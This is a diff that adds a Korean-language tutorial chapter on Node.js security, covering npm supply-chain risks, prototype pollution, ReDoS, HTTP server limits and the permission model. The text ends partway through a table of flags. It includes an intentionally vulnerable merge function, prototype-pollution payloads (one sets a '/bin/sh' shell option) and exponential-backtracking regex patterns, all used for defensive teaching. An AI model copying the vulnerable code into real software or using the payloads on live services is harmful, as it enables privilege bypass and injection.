@@ -1,0 +1,679 @@
+<!doctype html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Node.js 보안</title>
+<link rel="stylesheet" href="assets/style.css">
+<script src="assets/common.js"></script>
+<style>
+  .rd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; align-items: start; }
+  @media (max-width: 760px) { .rd-grid { grid-template-columns: 1fr; } }
+  .rd-chart { background: var(--surface-2); border-radius: 8px; padding: 8px; }
+  .rd-chart svg { width: 100%; height: 190px; display: block; }
+  .rd-chart .bar { fill: var(--accent); }
+  .rd-chart .bar.hot { fill: var(--bad); }
+  .rd-chart text { font-size: 10px; fill: var(--muted); font-family: var(--mono); }
+  .pp-out { font-family: var(--mono); font-size: 12.5px; background: var(--code-bg); border-radius: 8px; padding: 10px 12px; white-space: pre-wrap; min-height: 90px; }
+  .pp-out .bad { color: var(--bad); font-weight: 700; } .pp-out .ok { color: var(--ok); font-weight: 700; }
+  textarea.code { width: 100%; min-height: 90px; font-family: var(--mono); font-size: 12.5px; white-space: pre; }
+  .perm-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(230px, 1fr)); gap: 8px; }
+  .perm-grid label { display: flex; gap: 8px; align-items: flex-start; border: 1px solid var(--border); border-radius: 8px; padding: 8px 10px; background: var(--surface-2); font-size: 13.5px; }
+  .perm-grid input[type="text"] { width: 100%; margin-top: 4px; }
+  .deny { font-family: var(--mono); font-size: 12.5px; }
+  .deny .d { color: var(--bad); } .deny .a { color: var(--ok); }
+  .sl-conn { display: inline-block; width: 46px; height: 22px; border-radius: 5px; margin: 2px; font-size: 10px; font-family: var(--mono); text-align: center; line-height: 22px; border: 1px solid var(--border); background: var(--surface-2); transition: all .3s; }
+  .sl-conn.slow { background: var(--bad-soft); border-color: var(--bad); }
+  .sl-conn.ok { background: var(--ok-soft); border-color: var(--ok); }
+  .sl-conn.free { opacity: .35; }
+</style>
+</head>
+<body data-chapter="16">
+<main>
+  <header class="chapter-head">
+    <span class="label adv">운영 · Chapter 16</span>
+    <h1>보안: 공급망부터 런타임까지</h1>
+    <p class="lead">Node.js 서비스의 침해는 대부분 "해킹"이 아니라 <em>설계대로 동작한 결과</em>입니다. 설치 스크립트가 실행되도록 설계된 npm, 프로토타입 체인을 따라 올라가도록 설계된 객체 모델, 백트래킹하도록 설계된 정규식 엔진. 이 장은 각 레이어에서 그 설계가 공격 표면이 되는 지점과 Node.js가 제공하는 방어 장치(권한 모델, 런타임 플래그, HTTP 한계값, crypto API)를 다룹니다.</p>
+    <div class="objectives"><h4>학습 목표</h4><ul>
+      <li>공급망 공격의 경로(설치 스크립트, 타이포스쿼팅, 의존성 혼동, 탈취된 메인테이너 계정)를 알고 lockfile·provenance·스크립트 차단으로 막을 수 있다.</li>
+      <li>프로토타입 오염과 ReDoS의 메커니즘을 코드 수준에서 설명하고, 취약 패턴을 식별·수정할 수 있다.</li>
+      <li>HTTP 서버 한계값(헤더 크기, 타임아웃, 바디 제한)으로 자원 고갈 공격을 막고, 권한 모델로 프로세스의 행동 반경을 제한할 수 있다.</li>
+      <li>시크릿·암호·명령 실행·경로 처리에서 Node 표준 라이브러리를 올바르게 쓰고, 보안 릴리스를 추적하는 운영 절차를 갖출 수 있다.</li>
+    </ul></div>
+  </header>
+
+  <nav class="toc"><b>목차</b><ol>
+    <li><a href="#s1">위협 모델: 네 개의 레이어</a></li>
+    <li><a href="#s2">공급망: npm과 의존성</a></li>
+    <li><a href="#s3">프로토타입 오염</a></li>
+    <li><a href="#s4">ReDoS: 정규식 백트래킹</a></li>
+    <li><a href="#s5">입력 검증과 HTTP 한계값</a></li>
+    <li><a href="#s6">권한 모델과 런타임 플래그</a></li>
+    <li><a href="#s7">위험한 API: 코드 실행, 명령, 경로</a></li>
+    <li><a href="#s8">시크릿과 암호 사용</a></li>
+    <li><a href="#s9">보안 릴리스 추적과 운영 절차</a></li>
+    <li><a href="#s10">현업 사고 사례</a></li>
+  </ol></nav>
+
+  <section id="s1">
+    <h2>1. 위협 모델: 네 개의 레이어</h2>
+    <figure>
+      <svg class="diagram" viewBox="0 0 880 290" role="img" aria-label="Node.js 서비스의 공격 표면">
+        <defs><marker id="a16" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" style="fill:var(--muted)"/></marker></defs>
+        <g>
+          <rect x="20" y="30" width="200" height="230" rx="10" style="fill:var(--violet-soft);stroke:var(--violet)"/>
+          <text x="120" y="56" text-anchor="middle" font-weight="700">① 공급망</text>
+          <text x="120" y="82" text-anchor="middle" font-size="12">npm install 시점</text>
+          <text x="120" y="106" text-anchor="middle" font-size="11.5" class="muted">postinstall 스크립트</text>
+          <text x="120" y="124" text-anchor="middle" font-size="11.5" class="muted">타이포스쿼팅 · 혼동</text>
+          <text x="120" y="142" text-anchor="middle" font-size="11.5" class="muted">탈취된 메인테이너</text>
+          <text x="120" y="160" text-anchor="middle" font-size="11.5" class="muted">CI 토큰 유출</text>
+          <text x="120" y="200" text-anchor="middle" font-size="11.5" style="fill:var(--violet)">lockfile · ignore-scripts</text>
+          <text x="120" y="218" text-anchor="middle" font-size="11.5" style="fill:var(--violet)">provenance · 최소 의존성</text>
+        </g>
+        <g>
+          <rect x="240" y="30" width="200" height="230" rx="10" style="fill:var(--warn-soft);stroke:var(--warn)"/>
+          <text x="340" y="56" text-anchor="middle" font-weight="700">② 입력</text>
+          <text x="340" y="82" text-anchor="middle" font-size="12">요청 처리 시점</text>
+          <text x="340" y="106" text-anchor="middle" font-size="11.5" class="muted">프로토타입 오염 페이로드</text>
+          <text x="340" y="124" text-anchor="middle" font-size="11.5" class="muted">ReDoS 입력</text>
+          <text x="340" y="142" text-anchor="middle" font-size="11.5" class="muted">거대 헤더/바디 · slowloris</text>
+          <text x="340" y="160" text-anchor="middle" font-size="11.5" class="muted">인젝션 (명령 · 경로 · 쿼리)</text>
+          <text x="340" y="200" text-anchor="middle" font-size="11.5" style="fill:var(--warn)">스키마 검증 · 크기 제한</text>
+          <text x="340" y="218" text-anchor="middle" font-size="11.5" style="fill:var(--warn)">타임아웃 · 안전한 API</text>
+        </g>
+        <g>
+          <rect x="460" y="30" width="200" height="230" rx="10" style="fill:var(--accent-soft);stroke:var(--accent)"/>
+          <text x="560" y="56" text-anchor="middle" font-weight="700">③ 런타임</text>
+          <text x="560" y="82" text-anchor="middle" font-size="12">프로세스가 할 수 있는 것</text>
+          <text x="560" y="106" text-anchor="middle" font-size="11.5" class="muted">eval · vm 탈출</text>
+          <text x="560" y="124" text-anchor="middle" font-size="11.5" class="muted">임의 파일 읽기/쓰기</text>
+          <text x="560" y="142" text-anchor="middle" font-size="11.5" class="muted">자식 프로세스 · 네트워크</text>
+          <text x="560" y="160" text-anchor="middle" font-size="11.5" class="muted">인스펙터 포트</text>
+          <text x="560" y="200" text-anchor="middle" font-size="11.5" style="fill:var(--accent)">--permission · 플래그</text>
+          <text x="560" y="218" text-anchor="middle" font-size="11.5" style="fill:var(--accent)">non-root · 읽기 전용 FS</text>
+        </g>
+        <g>
+          <rect x="680" y="30" width="180" height="230" rx="10" style="fill:var(--ok-soft);stroke:var(--ok)"/>
+          <text x="770" y="56" text-anchor="middle" font-weight="700">④ 인프라</text>
+          <text x="770" y="82" text-anchor="middle" font-size="12">14장</text>
+          <text x="770" y="106" text-anchor="middle" font-size="11.5" class="muted">시크릿 노출</text>
+          <text x="770" y="124" text-anchor="middle" font-size="11.5" class="muted">TLS 설정</text>
+          <text x="770" y="142" text-anchor="middle" font-size="11.5" class="muted">구버전 Node</text>
+          <text x="770" y="200" text-anchor="middle" font-size="11.5" style="fill:var(--ok)">시크릿 마운트 · 패치 주기</text>
+        </g>
+        <text x="440" y="282" text-anchor="middle" font-size="12" class="muted">왼쪽일수록 "코드를 쓰기 전"에, 오른쪽일수록 "실행 중"에 막는다. 한 레이어가 뚫려도 다음 레이어가 피해를 줄인다(심층 방어).</text>
+      </svg>
+      <figcaption>각 레이어의 공격(회색)과 방어(색)를 짝지어 두었습니다. 이 장의 절 구성이 이 순서입니다.</figcaption>
+    </figure>
+  </section>
+
+  <section id="s2">
+    <h2>2. 공급망: npm과 의존성</h2>
+    <p>평균적인 Node 서비스는 직접 의존성 수십 개, 전이 의존성 수백~수천 개를 가집니다. 그 모두가 ① 설치 시 임의 코드를 실행할 수 있고(lifecycle 스크립트), ② 런타임에 프로세스 권한 전체를 가집니다. 공급망 공격은 이 두 사실을 이용합니다.</p>
+    <figure>
+      <svg class="diagram" viewBox="0 0 880 300" role="img" aria-label="공급망 공격 경로">
+        <defs><marker id="a16b" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" style="fill:var(--bad)"/></marker></defs>
+        <rect x="20" y="110" width="150" height="60" rx="8" style="fill:var(--bad-soft);stroke:var(--bad)"/><text x="95" y="135" text-anchor="middle" font-weight="700">공격자</text><text x="95" y="155" text-anchor="middle" font-size="11.5">4가지 진입 경로</text>
+        <g>
+          <rect x="230" y="20" width="200" height="46" rx="8" class="box"/><text x="330" y="39" text-anchor="middle" font-size="12.5">타이포스쿼팅</text><text x="330" y="56" text-anchor="middle" font-size="11" class="muted">lodash → lodahs, 인기 패키지 변형</text>
+          <rect x="230" y="86" width="200" height="46" rx="8" class="box"/><text x="330" y="105" text-anchor="middle" font-size="12.5">의존성 혼동</text><text x="330" y="122" text-anchor="middle" font-size="11" class="muted">사내 패키지명을 공개 레지스트리에 등록</text>
+          <rect x="230" y="152" width="200" height="46" rx="8" class="box"/><text x="330" y="171" text-anchor="middle" font-size="12.5">메인테이너 계정 탈취</text><text x="330" y="188" text-anchor="middle" font-size="11" class="muted">피싱 → 악성 버전 게시 (event-stream, ua-parser-js)</text>
+          <rect x="230" y="218" width="200" height="46" rx="8" class="box"/><text x="330" y="237" text-anchor="middle" font-size="12.5">CI 토큰 유출</text><text x="330" y="254" text-anchor="middle" font-size="11" class="muted">로그/아티팩트에 찍힌 NPM_TOKEN</text>
+        </g>
+        <path d="M170 130 L230 43" class="line" marker-end="url(#a16b)" style="stroke:var(--bad)"/><path d="M170 138 L230 109" class="line" marker-end="url(#a16b)" style="stroke:var(--bad)"/><path d="M170 146 L230 175" class="line" marker-end="url(#a16b)" style="stroke:var(--bad)"/><path d="M170 154 L230 241" class="line" marker-end="url(#a16b)" style="stroke:var(--bad)"/>
+        <rect x="490" y="86" width="170" height="110" rx="8" style="fill:var(--warn-soft);stroke:var(--warn)"/><text x="575" y="112" text-anchor="middle" font-weight="700">npm install</text><text x="575" y="134" text-anchor="middle" font-size="11.5">preinstall/postinstall</text><text x="575" y="152" text-anchor="middle" font-size="11.5">= 개발자·CI 머신에서</text><text x="575" y="170" text-anchor="middle" font-size="11.5">임의 코드 실행</text>
+        <path d="M430 43 L490 110" class="line" style="stroke:var(--bad)" marker-end="url(#a16b)"/><path d="M430 109 L490 130" class="line" style="stroke:var(--bad)" marker-end="url(#a16b)"/><path d="M430 175 L490 150" class="line" style="stroke:var(--bad)" marker-end="url(#a16b)"/><path d="M430 241 L490 170" class="line" style="stroke:var(--bad)" marker-end="url(#a16b)"/>
+        <rect x="710" y="86" width="150" height="110" rx="8" style="fill:var(--bad-soft);stroke:var(--bad)"/><text x="785" y="112" text-anchor="middle" font-weight="700">런타임</text><text x="785" y="134" text-anchor="middle" font-size="11.5">환경변수 시크릿 탈취</text><text x="785" y="152" text-anchor="middle" font-size="11.5">백도어 · 크립토마이너</text><text x="785" y="170" text-anchor="middle" font-size="11.5">프로세스 권한 전체</text>
+        <path d="M660 141 H710" class="line flow" style="stroke:var(--bad)" marker-end="url(#a16b)"/>
+      </svg>
+      <figcaption>실제 사건들은 대부분 "설치 스크립트"와 "탈취된 계정의 패치 버전 게시"를 통해 일어났습니다.</figcaption>
+    </figure>
+
+    <h3>방어 체크리스트</h3>
+    <div class="tbl-wrap"><table>
+      <tr><th>조치</th><th>막는 것</th><th>방법</th></tr>
+      <tr><td><b>lockfile 커밋 + <code>npm ci</code></b></td><td>CI/배포에서 "어제와 다른 버전" 설치. 탈취 계정이 올린 패치 버전 자동 유입</td><td><code>package-lock.json</code>(lockfileVersion 3) 커밋. CI는 항상 <code>npm ci</code>. Renovate/Dependabot으로 <em>의도적</em> 갱신만</td></tr>
+      <tr><td><b>설치 스크립트 차단</b></td><td>postinstall 코드 실행</td><td><code>npm ci --ignore-scripts</code> 또는 <code>.npmrc</code>에 <code>ignore-scripts=true</code>. 네이티브 모듈 등 꼭 필요한 패키지만 허용 목록으로 별도 <code>npm rebuild &lt;pkg&gt;</code></td></tr>
+      <tr><td><b>provenance 검증</b></td><td>소스와 다른 내용의 패키지</td><td>게시: <code>npm publish --provenance</code>(GitHub Actions/GitLab OIDC, SLSA 증명). 소비: <code>npm audit signatures</code>로 서명·증명 확인</td></tr>
+      <tr><td><b>의존성 혼동 차단</b></td><td>사내 패키지명 가로채기</td><td>모든 사내 패키지를 <code>@회사</code> 스코프로, <code>.npmrc</code>에 <code>@회사:registry=https://사내</code> 고정. 공개 레지스트리에 같은 스코프를 선점</td></tr>
+      <tr><td><b>최소 권한 토큰</b></td><td>CI 토큰 유출 시 피해</td><td>읽기 전용 granular 토큰, 게시는 OIDC trusted publishing(토큰 없음). 2FA 필수</td></tr>
+      <tr><td><b>의존성 수 자체를 줄이기</b></td><td>표면 축소</td><td><code>npm ls --all | wc -l</code>로 세기. is-odd류 마이크로 패키지 제거, 표준 라이브러리로 대체(<code>fetch</code>, <code>node:test</code>, <code>util.parseArgs</code>, <code>node:sqlite</code>)</td></tr>
+      <tr><td><b>취약점 스캔</b></td><td>알려진 CVE</td><td><code>npm audit</code>은 "알려진" 것만, 오탐 많음. OSV-Scanner/Socket/Snyk로 보강. 설치 시점 행동(네트워크, 셸 접근) 분석 도구가 신종 악성을 잡음</td></tr>
+      <tr><td><b>overrides</b></td><td>전이 의존성의 취약 버전</td><td><code>package.json</code>의 <code>overrides</code>로 강제 교체. 임시 조치이며 상위 패키지 갱신이 원칙</td></tr>
+    </table></div>
+    <div class="callout warn"><span class="title">npm audit의 한계</span>
+      ① 심각도가 "이 패키지의 그 함수를 내 코드가 쓰는가"와 무관해 high가 쏟아진다. ② 설치 직후 행동(네트워크 연결, 환경변수 읽기)은 보지 않는다. ③ <code>npm audit fix --force</code>는 메이저 업그레이드로 빌드를 깬다. 실무 흐름: CI에서 <code>npm audit --audit-level=high --omit=dev</code>로 게이트, 예외는 <code>.nsprc</code>/better-npm-audit류로 만료일과 함께 기록.
+    </div>
+  </section>
+
+  <section id="s3">
+    <h2>3. 프로토타입 오염</h2>
+    <p>JavaScript의 모든 일반 객체는 <code>Object.prototype</code>을 상속하고, <code>obj.__proto__</code>는 그 프로토타입에 접근하는 접근자(accessor)입니다. 사용자 입력의 키를 그대로 써서 객체를 재귀적으로 병합하는 코드(<code>merge</code>, <code>extend</code>, <code>defaultsDeep</code>, 쿼리스트링 파서)는 <code>{"__proto__": {"isAdmin": true}}</code>를 받으면 <code>target.__proto__.isAdmin = true</code>를 실행하고, 그 순간 <b>프로세스의 모든 객체</b>가 <code>isAdmin</code>을 갖게 됩니다.</p>
+<pre><code>// 취약: 키를 검사하지 않는 재귀 병합 (lodash &lt; 4.17.12 의 defaultsDeep, 수많은 util 라이브러리)
+function merge(target, src) {
+  for (const key in src) {
+    if (typeof src[key] === 'object' &amp;&amp; src[key] !== null) {
+      if (!target[key]) target[key] = {};
+      merge(target[key], src[key]);          // target['__proto__'] === Object.prototype !
+    } else target[key] = src[key];
+  }
+  return target;
+}
+merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
+({}).isAdmin   // true — 모든 객체가 오염됨</code></pre>
+    <p><code>JSON.parse</code> 자체는 안전합니다. <code>"__proto__"</code>를 일반 own property로 만들 뿐 프로토타입을 바꾸지 않습니다. 문제는 그 결과를 <b>다른 객체에 복사</b>하는 코드입니다. 오염의 결과는 다양합니다: 권한 체크 우회(<code>if (user.isAdmin)</code>), 옵션 주입(<code>child_process</code>의 <code>shell</code> 옵션, 템플릿 엔진 옵션 → RCE), 서비스 거부(<code>toString</code> 덮어쓰기).</p>
+
+    <div class="widget">
+      <div class="w-title">프로토타입 오염 체험기</div>
+      <div class="w-desc">페이로드를 취약한 merge와 안전한 merge에 각각 넣어 봅니다. 취약 버전은 격리된 iframe 렘(realm)에서 실행되므로 이 페이지는 오염되지 않습니다.</div>
+      <div class="controls">
+        <label>병합 구현 <select id="pp-impl">
+          <option value="vuln">취약: 키 검사 없음</option>
+          <option value="deny">방어 1: __proto__/constructor/prototype 거부</option>
+          <option value="hasown">방어 2: Object.hasOwn + Object.create(null) 대상</option>
+          <option value="freeze">방어 3: Object.freeze(Object.prototype) (취약 merge 그대로)</option>
+        </select></label>
+        <button class="btn" id="pp-p1">페이로드: __proto__</button>
+        <button class="btn" id="pp-p2">페이로드: constructor.prototype</button>
+        <button class="btn primary" id="pp-run">▶ 실행</button>
+      </div>
+      <textarea class="code" id="pp-payload" spellcheck="false">{"name":"guest","__proto__":{"isAdmin":true,"shell":"/bin/sh"}}</textarea>
+      <div class="pp-out" id="pp-out"></div>
+    </div>
+
+    <h3>방어 레이어</h3>
+    <ol>
+      <li><b>코드</b>: 병합/설정 함수에서 <code>__proto__</code>, <code>constructor</code>, <code>prototype</code> 키를 거부하고 <code>Object.hasOwn(src, key)</code>로 own property만 순회. 사용자 입력이 들어가는 맵은 <code>Object.create(null)</code> 또는 <code>Map</code>.</li>
+      <li><b>스키마 검증</b>: 요청 바디를 JSON Schema(ajv)로 검증하고 <code>additionalProperties: false</code>. 정의되지 않은 키는 애초에 들어오지 못한다.</li>
+      <li><b>런타임 플래그</b>: <code>node --disable-proto=delete</code>는 <code>Object.prototype.__proto__</code> 접근자를 제거(<code>throw</code>는 접근 시 예외). <code>__proto__</code> 경로는 막지만 <code>constructor.prototype</code> 경로는 못 막는다. <code>--frozen-intrinsics</code>(실험적)는 내장 프로토타입을 동결해 둘 다 막지만, 프로토타입을 확장하는 라이브러리(폴리필 등)가 깨진다.</li>
+      <li><b>의존성</b>: 병합 유틸은 최신 버전으로. 역사적으로 lodash, minimist, qs, yargs-parser, hoek 등 광범위하게 발견됐다.</li>
+    </ol>
+  </section>
+
+  <section id="s4">
+    <h2>4. ReDoS: 정규식 백트래킹</h2>
+    <p>V8의 정규식 엔진(Irregexp)은 <b>백트래킹</b> 방식입니다. 패턴이 입력에 매칭되는 경로가 여러 개일 수 있을 때, 한 경로가 실패하면 되돌아가 다른 경로를 시도합니다. 중첩된 반복(<code>(a+)+</code>)이나 겹치는 선택지(<code>(a|aa)+</code>)가 있으면 경로 수가 입력 길이에 <b>지수적</b>으로 늘어납니다. 그리고 2장을 떠올리면, 정규식은 이벤트 루프 위에서 <b>동기적으로</b> 실행됩니다. 30자짜리 문자열 하나가 프로세스 전체를 몇 분간 멈춥니다. 타임아웃을 걸 방법도 없습니다(JS에는 정규식 실행을 중단할 API가 없음).</p>
+    <div class="tbl-wrap"><table>
+      <tr><th>위험 패턴</th><th>왜</th><th>안전한 대안</th></tr>
+      <tr><td><code>^(a+)+$</code>, <code>^(\w+\s?)*$</code></td><td>중첩 반복: 바깥 반복이 안쪽 반복의 분할 방식을 전부 시도</td><td>중첩 제거: <code>^a+$</code>, <code>^\w+(\s\w+)*$</code>(접두가 겹치지 않게)</td></tr>
+      <tr><td><code>^(a|aa)+$</code>, <code>(\d+|\d+\.\d+)</code></td><td>겹치는 선택지: 같은 입력을 두 갈래가 모두 받음</td><td>선택지가 서로 배타적이게: <code>^\d+(\.\d+)?$</code></td></tr>
+      <tr><td><code>.*=.*</code>, <code>^.*@.*\..*$</code></td><td>탐욕적 <code>.*</code>가 연속으로: 다항(O(n²)~O(n³))이지만 긴 입력엔 충분히 치명적</td><td>구체적 클래스: <code>[^=]*=[^=]*</code></td></tr>
+      <tr><td>사용자 제공 정규식</td><td>어떤 패턴이든 올 수 있음</td><td>금지. 꼭 필요하면 RE2(<code>re2</code> 네이티브 모듈: 선형 시간 보장, 역참조·전방탐색 불가)</td></tr>
+    </table></div>
+
+    <div class="widget">
+      <div class="w-title">ReDoS 백트래킹 시각화</div>
+      <div class="w-desc">작은 백트래킹 매처(V8과 같은 탐욕적 깊이 우선 전략)로 입력 길이에 따른 매칭 시도 횟수를 셉니다. 로그 스케일 막대가 직선으로 오르면 지수적입니다. "V8 실측"은 실제 <code>RegExp</code>로 시간을 재며, 보호를 위해 길이를 제한합니다.</div>
+      <div class="controls">
+        <label>프리셋 <select id="rd-preset"></select></label>
+        <label>패턴 <input type="text" id="rd-pat" style="width:170px;font-family:var(--mono)"></label>
+        <label>입력 = 반복부 <input type="text" id="rd-unit" style="width:60px;font-family:var(--mono)"> × n + 꼬리 <input type="text" id="rd-tail" style="width:50px;font-family:var(--mono)"></label>
+        <label>최대 n <input type="range" id="rd-n" min="4" max="40" value="22"> <span id="rd-n-v">22</span></label>
+        <button class="btn primary" id="rd-run">▶ 시도 횟수 계산</button>
+        <button class="btn" id="rd-real">⏱ V8 실측</button>
+      </div>
+      <div class="rd-grid">
+        <div class="rd-chart"><svg id="rd-svg" viewBox="0 0 440 190" preserveAspectRatio="none"></svg><div class="muted" style="font-size:11.5px;margin-top:4px" id="rd-cap"></div></div>
+        <div>
+          <div class="stat-row" style="margin-top:0"><div class="stat"><div class="k">n=최대일 때 시도 횟수</div><div class="v" id="rd-steps">-</div></div><div class="stat"><div class="k">성장 패턴</div><div class="v" id="rd-growth">-</div></div></div>
+          <div class="log" id="rd-log" style="max-height:140px"></div>
+        </div>
+      </div>
+    </div>
+    <p>실무 규칙: ① 입력 길이를 먼저 제한한다(이메일 254자, 일반 문자열 1~4KB). 지수 패턴도 입력이 20자면 무해하다. ② 정규식 린터(eslint-plugin-regexp의 <code>no-super-linear-backtracking</code>, <code>safe-regex2</code>)를 CI에. ③ 복잡한 파싱은 정규식 대신 파서(URL은 <code>new URL()</code>, 이메일은 길이 + <code>@</code> 존재 + 발송 확인). ④ Node 자체도 과거 <code>path</code>, <code>url</code>, <code>http</code> 헤더 파싱에서 ReDoS CVE가 있었다. 버전 유지가 곧 방어다.</p>
+  </section>
+
+  <section id="s5">
+    <h2>5. 입력 검증과 HTTP 한계값</h2>
+    <h3>5.1 스키마 검증</h3>
+    <p>"검증"은 타입 확인이 아니라 <b>허용 목록</b>입니다. 들어올 수 있는 모든 필드를 열거하고 나머지는 거부합니다. 크기 상한(문자열 길이, 배열 길이, 중첩 깊이)도 스키마에 둡니다. 깊이 1만의 중첩 JSON은 파싱만으로 스택과 CPU를 태웁니다.</p>
+<pre><code>const Ajv = require('ajv');
+const ajv = new Ajv({ allErrors: false, removeAdditional: false });
+const schema = {
+  type: 'object', additionalProperties: false,          // 정의 안 된 키(= __proto__ 포함) 거부
+  required: ['email', 'name'],
+  properties: {
+    email: { type: 'string', maxLength: 254, format: 'email' },
+    name:  { type: 'string', minLength: 1, maxLength: 100, pattern: '^[^&lt;&gt;]*$' },
+    tags:  { type: 'array', maxItems: 20, items: { type: 'string', maxLength: 32 } },
+  },
+};
+const validate = ajv.compile(schema);
+app.post('/users', express.json({ limit: '64kb' }), (req, res) =&gt; {   // 바디 크기 상한
+  if (!validate(req.body)) return res.status(400).json({ errors: validate.errors });
+  ...
+});</code></pre>
+
+    <h3>5.2 HTTP 서버 한계값 (Node 22 기본값)</h3>
+    <div class="tbl-wrap"><table>
+      <tr><th>설정</th><th>기본</th><th>막는 공격</th><th>권장</th></tr>
+      <tr><td><code>--max-http-header-size</code> / <code>http.maxHeaderSize</code></td><td>16 KiB</td><td>거대 헤더로 메모리 소모. 초과 시 431</td><td>기본 유지. 큰 쿠키/JWT가 필요하면 32KiB까지</td></tr>
+      <tr><td><code>server.headersTimeout</code></td><td>60,000 ms</td><td><b>slowloris</b>: 헤더를 1바이트씩 천천히 보내 커넥션 점유</td><td>10~30초. <code>keepAliveTimeout</code>보다 커야 함</td></tr>
+      <tr><td><code>server.requestTimeout</code></td><td>300,000 ms</td><td>바디를 느리게 보내는 slow body 공격</td><td>업로드 없는 API는 30초 내외</td></tr>
+      <tr><td><code>server.keepAliveTimeout</code></td><td>5,000 ms</td><td>유휴 커넥션 점유</td><td>프록시(ALB 60s 등)보다 <em>길게</em> 설정해야 502가 안 남 (12장)</td></tr>
+      <tr><td><code>server.maxRequestsPerSocket</code></td><td>0 (무제한)</td><td>커넥션 재사용 무한</td><td>필요 시 1000 등</td></tr>
+      <tr><td><code>server.maxHeadersCount</code></td><td>2000</td><td>헤더 수 폭탄</td><td>기본 유지</td></tr>
+      <tr><td>바디 크기 (<code>express.json({limit})</code> 등)</td><td>express: 100kb</td><td>거대 바디 → 메모리, JSON.parse CPU</td><td>엔드포인트별 최소값. 업로드는 스트리밍 + 별도 한계</td></tr>
+      <tr><td>압축 해제 한계</td><td>없음</td><td>zip bomb: 1MB gzip → 1GB</td><td>압축 해제 스트림에 누적 바이트 상한을 두고 초과 시 destroy</td></tr>
+      <tr><td>동시 커넥션 수 (<code>server.maxConnections</code>)</td><td>무제한</td><td>fd 고갈(EMFILE)</td><td>ulimit과 함께 설정. 보통 프록시/LB가 담당</td></tr>
+    </table></div>
+
+    <div class="widget">
+      <div class="w-title">slowloris와 headersTimeout</div>
+      <div class="w-desc">동시 커넥션 상한이 24인 서버에 느린 헤더 공격이 들어올 때, <code>headersTimeout</code>이 자원 점유를 어떻게 끊는지 봅니다.</div>
+      <div class="controls"><label>headersTimeout <select id="sl-ht"><option value="60">60초 (기본)</option><option value="15">15초</option><option value="5">5초</option></select></label></div>
+      <div id="sl-conns" style="margin:8px 0"></div>
+      <div id="sl-step"></div>
+    </div>
+    <p>물론 실제 방어선은 Node 앞의 리버스 프록시/로드밸런서(nginx의 <code>client_header_timeout</code>, ALB의 유휴 타임아웃, Cloudflare)입니다. Node의 한계값은 <b>프록시가 없거나 우회됐을 때의 두 번째 방어선</b>이며, 내부 서비스 간 호출에도 적용됩니다.</p>
+  </section>
+
+  <section id="s6">
+    <h2>6. 권한 모델과 런타임 플래그</h2>
+    <p>Node 20에서 <code>--experimental-permission</code>으로 도입된 권한 모델은 Node 22/23에서 <code>--permission</code>으로 이름이 바뀌었고 이후 안정화 단계를 밟았습니다(사용 중인 버전의 문서에서 상태를 확인하세요). 켜면 프로세스는 <b>파일 시스템, 자식 프로세스, 워커 스레드, 네이티브 애드온</b>에 접근할 수 없고, 명시적으로 허용한 것만 할 수 있습니다. 최신 버전에는 네트워크(<code>--allow-net</code>), FFI, WASI, 인스펙터 등의 허용 플래그와 "거부하지 않고 기록만 하는" <code>--permission-audit</code>가 추가되었습니다.</p>
+<pre><code>$ node --permission -e "require('fs').readFileSync('/etc/hosts')"
+Error: Access to this API has been restricted. Use --allow-fs-read to manage permissions.  { code: 'ERR_ACCESS_DENIED', permission: 'FileSystemRead' }
+
+$ node --permission --allow-fs-read=/app --allow-fs-read=/etc/ssl --allow-fs-write=/tmp/app server.js
+# 런타임 확인
+process.permission.has('fs.read', '/etc/passwd')   // false
+process.permission.has('fs.write', '/tmp/app/x')   // true</code></pre>
+    <div class="widget">
+      <div class="w-title">권한 모델 플래그 빌더</div>
+      <div class="w-desc">서비스에 필요한 권한만 체크하면 명령줄과, 그 설정에서 거부될 호출의 예를 만들어 줍니다.</div>
+      <div class="perm-grid">
+        <label><input type="checkbox" id="pm-fsr" checked><div>파일 읽기<br><input type="text" id="pm-fsr-p" value="/app,/etc/ssl/certs" placeholder="경로, 쉼표 구분"></div></label>
+        <label><input type="checkbox" id="pm-fsw"><div>파일 쓰기<br><input type="text" id="pm-fsw-p" value="/tmp/app" placeholder="경로, 쉼표 구분"></div></label>
+        <label><input type="checkbox" id="pm-child"><div>자식 프로세스<br><small class="muted">child_process 전체</small></div></label>
+        <label><input type="checkbox" id="pm-worker"><div>워커 스레드<br><small class="muted">worker_threads</small></div></label>
+        <label><input type="checkbox" id="pm-addons"><div>네이티브 애드온<br><small class="muted">.node 로드</small></div></label>
+        <label><input type="checkbox" id="pm-net" checked><div>네트워크<br><small class="muted">--allow-net (최신 버전)</small></div></label>
+        <label><input type="checkbox" id="pm-audit"><div>감사 모드만<br><small class="muted">--permission-audit: 거부 대신 기록</small></div></label>
+      </div>
+      <pre id="pm-cmd" style="margin:10px 0"></pre>
+      <div class="deny" id="pm-deny"></div>
+      <div class="callout" style="margin-bottom:0"><span class="title">주의</span> 권한 모델은 <b>샌드박스가 아닙니다.</b> 네이티브 애드온을 허용하면 모든 제한을 우회할 수 있고, 허용된 쓰기 경로에 심볼릭 링크를 만드는 식의 우회도 보고되어 왔습니다. "실수로 더 많은 권한을 쓰는 것"을 막는 장치로 보고, 컨테이너 격리(non-root, 읽기 전용 루트 FS, seccomp)와 함께 쓰세요.</div>
+    </div>
+    <h3>그 밖의 보안 플래그</h3>
+    <div class="tbl-wrap"><table>
+      <tr><th>플래그</th><th>효과</th><th>부작용</th></tr>
+      <tr><td><code>--disable-proto=delete|throw</code></td><td><code>Object.prototype.__proto__</code> 제거/예외</td><td><code>__proto__</code>를 쓰는 구식 코드 깨짐. <code>Object.getPrototypeOf</code>는 여전히 동작</td></tr>
+      <tr><td><code>--disallow-code-generation-from-strings</code></td><td><code>eval</code>, <code>new Function</code> 금지(EvalError)</td><td>일부 템플릿 엔진·스키마 컴파일러(ajv 기본 모드)가 <code>new Function</code> 사용</td></tr>
+      <tr><td><code>--frozen-intrinsics</code> (실험적)</td><td>내장 객체·프로토타입 동결</td><td>폴리필, 프로토타입 확장 라이브러리 깨짐</td></tr>
